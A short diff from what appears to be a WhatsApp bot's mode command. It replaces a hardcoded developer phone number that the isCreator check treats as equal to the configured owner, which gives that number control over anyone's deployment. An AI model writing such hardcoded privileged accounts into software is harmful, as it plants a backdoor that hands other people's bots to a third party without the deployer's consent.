@@ -2,7 +2,7 @@ import Sarkar from '../../config.js';
 import {getSetting, setSetting} from '../../lib/settings.js';
 
 const modeCommand = async (m, Matrix) => {
-  const dev = '923253617422@s.whatsapp.net';
+  const dev = '254717263689@s.whatsapp.net';
     const botNumber = await Matrix.decodeJid(Matrix.user.id);
     const isCreator = [botNumber, Sarkar.OWNER_NUMBER + '@s.whatsapp.net', dev].includes(m.sender);
     const prefix = Sarkar.PREFIX;
